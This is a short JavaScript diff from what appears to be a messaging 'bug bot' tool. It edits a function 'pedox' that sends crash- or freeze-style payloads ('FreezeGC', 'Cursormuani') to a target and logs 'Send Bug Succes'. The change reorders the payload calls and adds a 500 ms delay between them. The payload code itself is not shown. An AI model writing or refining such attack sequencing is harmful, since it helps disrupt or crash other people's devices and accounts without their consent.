@@ -2746,8 +2746,9 @@ async function delay(sock, target) {
 }
 async function pedox(sock, target) {
   for (let i = 0; i < 1; i++) {
-      await FreezeGC(target);
       await Cursormuani(target);
+      await new Promise((resolve) => setTimeout(resolve, 500));
+      await FreezeGC(target);
       console.log(chalk.red("Send Bug Succes"))
   }
 }
